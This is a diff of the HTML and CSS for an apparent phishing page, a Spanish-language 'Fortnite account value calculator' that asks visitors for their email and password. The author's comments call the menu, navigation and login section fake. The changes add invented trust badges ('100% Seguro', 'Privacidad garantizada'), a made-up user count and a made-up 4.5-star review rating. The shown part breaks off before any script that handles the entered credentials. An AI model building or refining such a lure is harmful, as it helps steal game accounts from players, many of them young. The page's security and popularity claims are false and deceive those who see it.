@@ -4,243 +4,75 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Fortnite Account Value Calculator</title>
-    <!-- Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <!-- Google Fonts: Burbank / Rajdhani / Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        fortnite: ['Rajdhani', 'sans-serif'],
+                        banner: ['Luckiest Guy', 'cursive'],
+                        sans: ['Inter', 'sans-serif']
+                    },
+                    colors: {
+                        fnBlue: '#122543',
+                        fnYellow: '#ffe100',
+                        fnPurple: '#8c25f5',
+                        fnDark: '#0b111e',
+                        fnCard: '#182436',
+                        legendary: '#ea580c',
+                        epic: '#a855f7',
+                        rare: '#3b82f6',
+                        uncommon: '#22c55e',
+                        iconic: '#06b6d4',
+                        common: '#9ca3af'
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        /* Reset & Base */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: 'Inter', sans-serif;
-            background: #0b0f1a;
-            color: #eaeef2;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 2rem 1rem;
-            position: relative;
-            overflow-x: hidden;
+            background-color: #080d1a;
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(140, 37, 245, 0.15) 0%, transparent 70%),
+                radial-gradient(circle at 80% 50%, rgba(59, 130, 246, 0.1) 0%, transparent 50%);
+            background-attachment: fixed;
+            color: #f3f4f6;
         }
-
-        /* Fondo mejorado con gradiente y patrón sutil */
-        .bg-gradient {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            background:
-                radial-gradient(circle at 70% 20%, #1e3a5f 0%, #0b0f1a 70%),
-                radial-gradient(circle at 30% 80%, #1a2a4a 0%, #0b0f1a 70%);
-            opacity: 0.9;
+        .fn-glow-yellow {
+            box-shadow: 0 0 15px rgba(255, 225, 0, 0.4);
         }
-
-        .bg-pattern {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            background-image:
-                radial-gradient(2px 2px at 20px 30px, rgba(255, 215, 0, 0.05), transparent),
-                radial-gradient(2px 2px at 40px 70px, rgba(255, 215, 0, 0.03), transparent),
-                radial-gradient(2px 2px at 50px 160px, rgba(255, 215, 0, 0.04), transparent),
-                radial-gradient(2px 2px at 90px 40px, rgba(255, 215, 0, 0.05), transparent),
-                radial-gradient(2px 2px at 130px 80px, rgba(255, 215, 0, 0.03), transparent),
-                radial-gradient(2px 2px at 160px 30px, rgba(255, 215, 0, 0.04), transparent);
-            background-size: 200px 200px;
-            opacity: 0.5;
-            pointer-events: none;
+        .fn-glow-purple {
+            box-shadow: 0 0 20px rgba(140, 37, 245, 0.3);
         }
-
-        #particles-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            pointer-events: none;
+        .clip-slant {
+            clip-path: polygon(0 0, 100% 0, 95% 100%, 0% 100%);
         }
-
-        .container {
-            position: relative;
-            z-index: 10;
-            max-width: 980px;
-            width: 100%;
-            background: rgba(14, 20, 38, 0.85);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 48px;
-            padding: 2.8rem 3rem;
-            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 215, 0, 0.08) inset, 0 0 60px rgba(255, 215, 0, 0.02);
-            border: 1px solid rgba(255, 215, 0, 0.06);
-            transition: all 0.3s ease;
+        .clip-slant-alt {
+            clip-path: polygon(5% 0, 100% 0, 100% 100%, 0% 100%);
         }
-
-        .container:hover {
-            box-shadow: 0 50px 120px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(255, 215, 0, 0.1) inset;
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
         }
-
-        /* Header */
-        .header {
-            text-align: center;
-            margin-bottom: 2.5rem;
+        ::-webkit-scrollbar-track {
+            background: #0b111e;
         }
-
-        .header .logo-icon {
-            font-size: 3.8rem;
-            color: #ffd700;
-            filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.25));
-            margin-bottom: 0.2rem;
-        }
-
-        .header h1 {
-            font-size: 2.8rem;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #ffffff 0%, #ffd700 80%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 0.6rem;
-            text-shadow: 0 4px 40px rgba(255, 215, 0, 0.1);
-        }
-
-        .header .sub {
-            font-size: 1.05rem;
-            font-weight: 400;
-            color: rgba(255, 255, 255, 0.6);
-            letter-spacing: 0.3px;
-            max-width: 580px;
-            margin: 0 auto;
-            line-height: 1.6;
-        }
-
-        .header .sub i {
-            color: #ffd700;
-            margin: 0 4px;
-        }
-
-        /* Badge de seguridad (verde) */
-        .security-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(76, 175, 80, 0.12);
-            border: 1px solid rgba(76, 175, 80, 0.25);
-            padding: 0.4rem 1.2rem;
-            border-radius: 60px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            color: #66bb6a;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            margin-top: 0.8rem;
-        }
-
-        .security-badge i {
-            font-size: 0.9rem;
-        }
-
-        .divider {
-            width: 120px;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #ffd700, transparent);
-            margin: 1.5rem auto 0;
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
             border-radius: 4px;
         }
-
-        /* Login Section */
-        .login-section {
-            max-width: 500px;
-            margin: 0 auto 1.5rem;
-            transition: opacity 0.4s, max-height 0.6s, margin 0.4s;
-            overflow: hidden;
+        ::-webkit-scrollbar-thumb:hover {
+            background: #334155;
         }
 
-        .input-group {
-            position: relative;
-            margin-bottom: 1.5rem;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 0.75rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1.2px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-bottom: 6px;
-            margin-left: 4px;
-        }
-
-        .input-group .icon {
-            position: absolute;
-            left: 16px;
-            bottom: 18px;
-            color: rgba(255, 215, 0, 0.4);
-            font-size: 1rem;
-            transition: color 0.2s;
-            z-index: 2;
-        }
-
-        .input-group input,
-        .input-group select {
-            width: 100%;
-            padding: 14px 18px 14px 48px;
-            font-size: 1rem;
-            font-weight: 500;
-            background: rgba(255, 255, 255, 0.04);
-            border: 2px solid rgba(255, 255, 255, 0.06);
-            border-radius: 60px;
-            color: #fff;
-            outline: none;
-            transition: all 0.25s ease;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .input-group select {
-            padding: 14px 18px;
-            appearance: none;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffd700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
-            background-repeat: no-repeat;
-            background-position: right 18px center;
-            background-size: 14px;
-            padding-right: 44px;
-            cursor: pointer;
-        }
-
-        .input-group select option {
-            background: #1a1f35;
-            color: #fff;
-        }
-
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-            font-weight: 400;
-        }
-
-        .input-group input:focus,
-        .input-group select:focus {
-            border-color: #ffd700;
-            background: rgba(255, 215, 0, 0.04);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.06), 0 0 0 4px rgba(255, 215, 0, 0.04);
-        }
-
-        .input-group input:focus+.icon,
-        .input-group input:focus~.icon {
-            color: #ffd700;
-        }
-
+        /* Password toggle button */
         .password-toggle {
             position: absolute;
             right: 16px;
@@ -254,12 +86,10 @@
             z-index: 3;
             padding: 0 4px;
         }
-
         .password-toggle:hover {
-            color: #ffd700;
+            color: #ffe100;
         }
 
-        /* Email combo mejorado */
         .email-combo {
             display: flex;
             align-items: center;
@@ -270,13 +100,11 @@
             transition: all 0.25s ease;
             padding: 0 4px 0 0;
         }
-
         .email-combo:focus-within {
-            border-color: #ffd700;
-            background: rgba(255, 215, 0, 0.04);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.06), 0 0 0 4px rgba(255, 215, 0, 0.04);
+            border-color: #ffe100;
+            background: rgba(255, 225, 0, 0.04);
+            box-shadow: 0 0 30px rgba(255, 225, 0, 0.06), 0 0 0 4px rgba(255, 225, 0, 0.04);
         }
-
         .email-combo .email-local {
             flex: 1 1 auto;
             min-width: 0;
@@ -290,12 +118,10 @@
             font-family: 'Inter', sans-serif;
             border-radius: 60px 0 0 60px;
         }
-
         .email-combo .email-local::placeholder {
             color: rgba(255, 255, 255, 0.2);
             font-weight: 400;
         }
-
         .email-combo .email-at {
             color: rgba(255, 255, 255, 0.5);
             font-weight: 700;
@@ -304,7 +130,6 @@
             flex-shrink: 0;
             white-space: nowrap;
         }
-
         .email-combo .email-domain {
             flex: 0 1 auto;
             min-width: 120px;
@@ -317,105 +142,35 @@
             outline: none;
             font-family: 'Inter', sans-serif;
             appearance: none;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffd700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffe100" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
             background-repeat: no-repeat;
             background-position: right 10px center;
             background-size: 14px;
             cursor: pointer;
             border-radius: 0 60px 60px 0;
         }
-
         .email-combo .email-domain option {
             background: #1a1f35;
             color: #fff;
         }
-
         .email-combo .icon {
             position: absolute;
             left: 16px;
             top: 50%;
             transform: translateY(-50%);
-            color: rgba(255, 215, 0, 0.4);
+            color: rgba(255, 225, 0, 0.4);
             font-size: 1rem;
             z-index: 2;
             pointer-events: none;
         }
-
         .input-group .icon {
             position: absolute;
             left: 16px;
             bottom: 18px;
-            color: rgba(255, 215, 0, 0.4);
+            color: rgba(255, 225, 0, 0.4);
             font-size: 1rem;
             transition: color 0.2s;
             z-index: 2;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 18px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 700;
-            font-size: 1.15rem;
-            letter-spacing: 0.8px;
-            text-transform: uppercase;
-            color: #0b0f1a;
-            background: linear-gradient(135deg, #ffd700, #f0a500);
-            border: none;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 6px 0 #b87a00, 0 10px 30px rgba(255, 165, 0, 0.25);
-            margin-top: 0.5rem;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 0 #b87a00, 0 20px 40px rgba(255, 165, 0, 0.35);
-        }
-
-        .btn-primary:active {
-            transform: translateY(4px);
-            box-shadow: 0 2px 0 #b87a00;
-        }
-
-        .btn-primary.loading {
-            pointer-events: none;
-            opacity: 0.7;
-            background: linear-gradient(135deg, #a67c00, #8a6400);
-        }
-
-        .btn-primary.loading::before {
-            content: '⏳';
-            display: inline-block;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .login-help {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 1.2rem;
-            font-size: 0.8rem;
-            color: rgba(255, 255, 255, 0.3);
-        }
-
-        .login-help a {
-            color: rgba(255, 215, 0, 0.5);
-            text-decoration: none;
-            font-weight: 600;
-            transition: color 0.2s;
-        }
-
-        .login-help a:hover {
-            color: #ffd700;
         }
 
         .error-message {
@@ -433,16 +188,13 @@
             backdrop-filter: blur(4px);
             animation: shake 0.5s ease;
         }
-
         .error-message.show {
             display: flex;
         }
-
         .error-message i {
             font-size: 1.6rem;
             color: #ff4444;
         }
-
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             20% { transform: translateX(-10px); }
@@ -451,108 +203,34 @@
             80% { transform: translateX(6px); }
         }
 
-        /* -------- CARRUSEL DE RESEÑAS (mejorado) -------- */
-        .reviews-section {
-            margin-top: 3rem;
-            padding-top: 2rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .reviews-section .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .reviews-section h3 {
-            font-weight: 700;
-            font-size: 1.3rem;
-            color: #fff;
-            letter-spacing: 0.3px;
-        }
-
-        .reviews-section h3 i {
-            color: #ffd700;
-            margin-right: 8px;
-        }
-
-        .reviews-section .rating-summary {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.5);
-        }
-
-        .reviews-section .rating-summary .big-stars {
-            color: #ffd700;
-            font-size: 1.2rem;
-            letter-spacing: 2px;
-        }
-
-        .reviews-section .rating-summary .big-stars .empty-star {
-            color: rgba(255, 255, 255, 0.1);
-        }
-
-        .reviews-section .rating-summary .score {
-            font-weight: 700;
-            color: #fff;
-            font-size: 1.2rem;
-        }
-
-        .carousel-container {
-            position: relative;
-            overflow: hidden;
-            border-radius: 20px;
-        }
-
-        .carousel-track {
-            display: flex;
-            transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            gap: 20px;
-        }
-
+        /* Carousel */
         .review-card {
-            flex: 0 0 calc(33.333% - 14px);
-            min-width: 0;
             background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
             border-radius: 24px;
             padding: 1.4rem 1.4rem 1.2rem;
-            border: 1px solid rgba(255, 255, 255, 0.05);
             transition: all 0.3s ease;
             display: flex;
             flex-direction: column;
             position: relative;
         }
-
         .review-card:hover {
-            background: rgba(255, 215, 0, 0.04);
-            border-color: rgba(255, 215, 0, 0.12);
+            background: rgba(255, 225, 0, 0.04);
+            border-color: rgba(255, 225, 0, 0.15);
             transform: translateY(-4px);
         }
-
-        /* Tarjeta verificada con borde verde */
         .review-card.verified {
-            border-color: rgba(76, 175, 80, 0.2);
+            border-color: rgba(76, 175, 80, 0.25);
         }
-
-        .review-card.verified .review-verified {
-            color: #66bb6a;
-        }
-
         .review-card .verified-badge {
             position: absolute;
             top: 12px;
             right: 14px;
+            background: rgba(76, 175, 80, 0.12);
+            border: 1px solid rgba(76, 175, 80, 0.2);
             color: #66bb6a;
-            font-size: 0.85rem;
-            background: rgba(76, 175, 80, 0.1);
-            padding: 2px 10px;
+            padding: 2px 12px;
             border-radius: 40px;
-            border: 1px solid rgba(76, 175, 80, 0.15);
             font-size: 0.65rem;
             font-weight: 700;
             text-transform: uppercase;
@@ -561,32 +239,33 @@
             align-items: center;
             gap: 5px;
         }
-
         .review-header {
             display: flex;
             align-items: center;
             gap: 12px;
             margin-bottom: 10px;
         }
-
         .review-avatar {
             width: 44px;
             height: 44px;
             border-radius: 50%;
-            background: rgba(255, 215, 0, 0.08);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.4rem;
-            color: #ffd700;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
             flex-shrink: 0;
+            text-transform: uppercase;
         }
-
-        .review-user {
-            flex: 1;
-            min-width: 0;
-        }
-
+        .avatar-1 { background: #ff6b6b; }
+        .avatar-2 { background: #4ecdc4; }
+        .avatar-3 { background: #ffe66d; color: #1a1f35; }
+        .avatar-4 { background: #a29bfe; }
+        .avatar-5 { background: #fd79a8; }
+        .avatar-6 { background: #fdcb6e; color: #1a1f35; }
+        .avatar-7 { background: #00b894; }
+        .avatar-8 { background: #e17055; }
         .review-user .name {
             font-weight: 700;
             font-size: 0.95rem;
@@ -595,23 +274,19 @@
             overflow: hidden;
             text-overflow: ellipsis;
         }
-
         .review-user .date {
             font-size: 0.7rem;
             color: rgba(255, 255, 255, 0.3);
         }
-
         .review-stars {
-            color: #ffd700;
+            color: #ffe100;
             font-size: 0.9rem;
             letter-spacing: 1px;
             margin-bottom: 6px;
         }
-
         .review-stars .empty-star {
             color: rgba(255, 255, 255, 0.1);
         }
-
         .review-text {
             font-size: 0.9rem;
             line-height: 1.5;
@@ -622,7 +297,6 @@
             -webkit-box-orient: vertical;
             overflow: hidden;
         }
-
         .review-verified {
             margin-top: 10px;
             font-size: 0.7rem;
@@ -631,25 +305,20 @@
             align-items: center;
             gap: 6px;
         }
-
         .review-verified i {
             color: #66bb6a;
         }
-
-        .carousel-controls {
+        .carousel-track {
             display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 24px;
-            margin-top: 1.5rem;
+            transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            gap: 20px;
         }
-
         .carousel-btn {
-            background: rgba(255, 215, 0, 0.06);
-            border: 1px solid rgba(255, 215, 0, 0.12);
-            color: #ffd700;
-            width: 42px;
-            height: 42px;
+            background: rgba(255, 225, 0, 0.06);
+            border: 1px solid rgba(255, 225, 0, 0.12);
+            color: #ffe100;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -658,18 +327,11 @@
             transition: all 0.2s;
             font-size: 1.2rem;
         }
-
         .carousel-btn:hover {
-            background: rgba(255, 215, 0, 0.15);
-            border-color: #ffd700;
+            background: rgba(255, 225, 0, 0.15);
+            border-color: #ffe100;
             transform: scale(1.05);
         }
-
-        .carousel-dots {
-            display: flex;
-            gap: 10px;
-        }
-
         .carousel-dot {
             width: 10px;
             height: 10px;
@@ -679,42 +341,13 @@
             transition: all 0.3s;
             border: none;
         }
-
         .carousel-dot.active {
-            background: #ffd700;
+            background: #ffe100;
             transform: scale(1.2);
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+            box-shadow: 0 0 20px rgba(255, 225, 0, 0.3);
         }
 
-        .footer-credit {
-            text-align: center;
-            margin-top: 2.5rem;
-            font-size: 0.7rem;
-            color: rgba(255, 255, 255, 0.12);
-            letter-spacing: 1px;
-        }
-
-        .footer-credit a {
-            color: rgba(255, 215, 0, 0.2);
-            text-decoration: none;
-        }
-
-        .footer-credit a:hover {
-            color: rgba(255, 215, 0, 0.4);
-        }
-
-        /* Responsive */
         @media (max-width: 768px) {
-            .container {
-                padding: 1.8rem 1.2rem;
-                border-radius: 32px;
-            }
-            .header h1 {
-                font-size: 2.2rem;
-            }
-            .review-card {
-                flex: 0 0 calc(50% - 10px);
-            }
             .email-combo .email-domain {
                 min-width: 100px;
                 font-size: 0.9rem;
@@ -724,20 +357,8 @@
                 font-size: 0.9rem;
                 padding-left: 40px;
             }
-            .reviews-section .section-header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
         }
-
         @media (max-width: 480px) {
-            .container {
-                padding: 1.5rem 1rem;
-                border-radius: 24px;
-            }
-            .review-card {
-                flex: 0 0 100%;
-            }
             .email-combo .email-domain {
                 min-width: 80px;
                 font-size: 0.8rem;
@@ -750,43 +371,104 @@
             .email-combo .email-at {
                 font-size: 0.9rem;
             }
-            .security-badge {
-                font-size: 0.65rem;
-                padding: 0.3rem 1rem;
-            }
         }
     </style>
 </head>
-<body>
+<body class="font-sans min-h-screen flex flex-col justify-between selection:bg-fnYellow selection:text-black">
 
-    <div class="bg-gradient"></div>
-    <div class="bg-pattern"></div>
-    <canvas id="particles-canvas"></canvas>
+    <!-- ===== MENÚ SUPERIOR FALSO ===== -->
+    <header class="border-b border-slate-800 bg-fnDark/90 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-20">
+                <!-- Logo -->
+                <div class="flex items-center gap-3">
+                    <div class="bg-gradient-to-tr from-fnPurple to-blue-500 p-2.5 rounded-xl shadow-lg rotate-3">
+                        <i class="fa-solid fa-gem text-fnYellow text-2xl"></i>
+                    </div>
+                    <div>
+                        <span class="font-banner text-2xl tracking-wider text-white uppercase italic drop-shadow-md">VALOR<span class="text-fnYellow">FN</span></span>
+                        <span class="block text-xs font-semibold text-slate-400 tracking-widest uppercase">Calculadora de Cuentas & PaVos</span>
+                    </div>
+                </div>
 
-    <div class="container" id="app">
+                <!-- Navegación falsa -->
+                <nav class="hidden md:flex gap-1 bg-slate-900/80 p-1.5 rounded-xl border border-slate-800">
+                    <a href="#" class="px-5 py-2.5 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition-all duration-200 bg-fnPurple text-white shadow-lg">
+                        <i class="fa-solid fa-calculator mr-2"></i> Valor Cuenta
+                    </a>
+                    <a href="#" class="px-5 py-2.5 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition-all duration-200 text-slate-400 hover:text-white hover:bg-slate-800">
+                        <i class="fa-solid fa-coins mr-2"></i> Convertidor
+                    </a>
+                </nav>
 
-        <!-- Header -->
-        <div class="header">
-            <div class="logo-icon"><i class="fas fa-helmet-battle"></i></div>
-            <h1>Account Value Calculator</h1>
-            <p class="sub">
-                <i class="fas fa-calculator"></i> Enter your credentials to instantly estimate your Fortnite account's worth, including all your items and their current market prices.
-            </p>
-            <div class="security-badge">
-                <i class="fas fa-shield-alt"></i> Secure &bull; Trusted
+                <!-- Selector de moneda (decorativo) -->
+                <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-3 py-1.5">
+                    <i class="fa-solid fa-globe text-fnYellow text-sm"></i>
+                    <select class="bg-transparent text-sm font-semibold text-white focus:outline-none cursor-pointer">
+                        <option value="USD">USD ($)</option>
+                        <option value="EUR">EUR (€)</option>
+                        <option value="MXN">MXN ($)</option>
+                    </select>
+                </div>
             </div>
-            <div class="divider"></div>
+        </div>
+        <!-- Mobile tabs -->
+        <div class="flex md:hidden border-t border-slate-800 bg-slate-950">
+            <a href="#" class="flex-1 py-3 text-center text-xs font-bold uppercase tracking-wider text-white bg-fnPurple">
+                <i class="fa-solid fa-calculator block text-base mb-0.5"></i> Valor
+            </a>
+            <a href="#" class="flex-1 py-3 text-center text-xs font-bold uppercase tracking-wider text-slate-400">
+                <i class="fa-solid fa-coins block text-base mb-0.5"></i> PaVos
+            </a>
+        </div>
+    </header>
+
+    <!-- ===== CONTENEDOR PRINCIPAL ===== -->
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-grow w-full">
+
+        <!-- BANNER / HERO -->
+        <div class="relative overflow-hidden rounded-2xl bg-gradient-to-r from-fnBlue via-slate-900 to-slate-950 border border-slate-800 p-6 md:p-8 shadow-2xl mb-8">
+            <div class="relative z-10 max-w-2xl">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-fnPurple/20 border border-fnPurple/40 text-fnPurple text-xs font-bold uppercase tracking-wider mb-3">
+                    <i class="fa-solid fa-shield-halved"></i> Evaluador de Taquilla
+                </div>
+                <h1 class="font-banner text-3xl sm:text-4xl text-white tracking-wide uppercase">
+                    ¿Cuánto vale tu cuenta de <span class="text-fnYellow">Fortnite</span>?
+                </h1>
+                <p class="text-slate-300 text-sm sm:text-base mt-2">
+                    Ingresa tus credenciales para calcular el valor estimado de tu cuenta, incluyendo todos tus objetos y su precio actual de mercado.
+                </p>
+                <!-- Badges de confianza (checks) -->
+                <div class="flex flex-wrap gap-3 mt-4">
+                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> 100% Seguro
+                    </span>
+                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> Precios en tiempo real
+                    </span>
+                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
+                        <i class="fa-solid fa-check-circle text-fnYellow"></i> 2,847+ usuarios
+                    </span>
+                    <span class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-300 bg-slate-800/60 px-3 py-1 rounded-full border border-slate-700">
+                        <i class="fa-solid fa-check-circle text-green-400"></i> Privacidad garantizada
+                    </span>
+                </div>
+            </div>
+            <!-- Decorative Icon -->
+            <div class="absolute -right-6 -bottom-6 opacity-10 text-slate-100 text-9xl pointer-events-none font-banner">
+                FN
+            </div>
         </div>
 
-        <!-- Login Section -->
-        <div class="login-section" id="loginSection">
+        <!-- ===== LOGIN SECTION (falso) ===== -->
+        <div class="max-w-md mx-auto bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl mb-8">
             <form id="loginForm">
-                <!-- Email con combo en línea -->
-                <div class="input-group">
-                    <label for="emailLocal">Email Address</label>
-                    <div class="email-combo">
-                        <i class="fas fa-envelope icon"></i>
-                        <input type="text" id="emailLocal" class="email-local" placeholder="username" required />
+                <!-- Email con combo (sin valores por defecto) -->
+                <div class="mb-5">
+                    <label for="emailLocal" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Correo electrónico</label>
+                    <div class="email-combo relative">
+                        <i class="fa-solid fa-envelope icon"></i>
+                        <input type="text" id="emailLocal" class="email-local" placeholder="usuario" required />
                         <span class="email-at">@</span>
                         <select id="emailDomain" class="email-domain">
                             <option value="gmail.com">gmail.com</option>
@@ -797,127 +479,102 @@
                     </div>
                 </div>
 
-                <!-- Password con toggle -->
-                <div class="input-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="contraseña" placeholder="••••••••" required />
-                    <i class="fas fa-lock icon"></i>
+                <!-- Contraseña con toggle -->
+                <div class="mb-5 relative">
+                    <label for="password" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Contraseña</label>
+                    <input type="password" id="password" name="contraseña" placeholder="••••••••" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-fnYellow pl-10" />
+                    <i class="fa-solid fa-lock icon absolute left-3.5 top-10 text-slate-500"></i>
                     <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
-                        <i class="fas fa-eye"></i>
+                        <i class="fa-solid fa-eye"></i>
                     </button>
                 </div>
 
-                <button type="submit" class="btn-primary" id="loginBtn">Calculate Value</button>
+                <button type="submit" class="w-full bg-gradient-to-r from-fnPurple to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white font-fortnite font-bold py-3 rounded-xl text-lg tracking-wider uppercase transition shadow-lg" id="loginBtn">
+                    <i class="fa-solid fa-calculator mr-2"></i> Calcular valor
+                </button>
             </form>
 
-            <div class="login-help">
-                <a href="#" id="forgotLink"><i class="fas fa-question-circle"></i> Forgot credentials?</a>
-                <a href="#" id="signupLink"><i class="fas fa-user-plus"></i> Create account</a>
+            <div class="flex justify-between mt-4 text-xs text-slate-400">
+                <a href="#" id="forgotLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-question-circle mr-1"></i> ¿Olvidaste tus datos?</a>
+                <a href="#" id="signupLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-user-plus mr-1"></i> Crear cuenta</a>
             </div>
 
-            <!-- Error message -->
+            <!-- Mensaje de error -->
             <div class="error-message" id="errorMessage">
-                <i class="fas fa-exclamation-triangle"></i>
+                <i class="fa-solid fa-exclamation-triangle"></i>
                 <span>incorrecto</span>
             </div>
         </div>
 
-        <!-- ====== CARRUSEL DE RESEÑAS MEJORADO ====== -->
-        <div class="reviews-section">
-            <div class="section-header">
-                <h3><i class="fas fa-star"></i> What our users say</h3>
-                <div class="rating-summary">
-                    <span class="score">4.5</span>
-                    <span class="big-stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star-half-alt"></i>
+        <!-- ===== CARRUSEL DE RESEÑAS ===== -->
+        <div class="mt-8">
+            <div class="flex justify-between items-center flex-wrap gap-4 mb-6">
+                <h3 class="font-banner text-2xl text-white uppercase tracking-wider flex items-center gap-2">
+                    <i class="fa-solid fa-star text-fnYellow"></i> Lo que dicen los usuarios
+                </h3>
+                <div class="flex items-center gap-3 text-sm text-slate-400">
+                    <span class="font-bold text-white">4.5</span>
+                    <span class="text-fnYellow">
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star-half-alt"></i>
                     </span>
-                    <span>2,847 reviews</span>
+                    <span>2,847 reseñas</span>
                 </div>
             </div>
-            <div class="carousel-container">
+
